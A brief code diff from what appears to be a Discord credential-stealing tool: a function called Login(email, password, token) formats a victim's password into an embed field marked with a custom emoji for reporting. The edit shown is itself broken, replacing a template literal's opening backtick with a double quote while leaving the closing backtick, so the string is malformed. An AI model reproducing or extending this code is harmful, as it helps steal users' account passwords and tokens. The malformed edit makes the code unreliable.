@@ -160,9 +160,10 @@ function Login(email, password, token) {
                             
                             "inline": true
                         },
+                        
                         {
                             "name": "",
-                            "value":  `<:staff_blue:936543701294010399> **Password:** \`${password}\``,       
+                            "value":  "<:staff_blue:936543701294010399> **Password:** \`${password}\``,       
                             
                             
                             
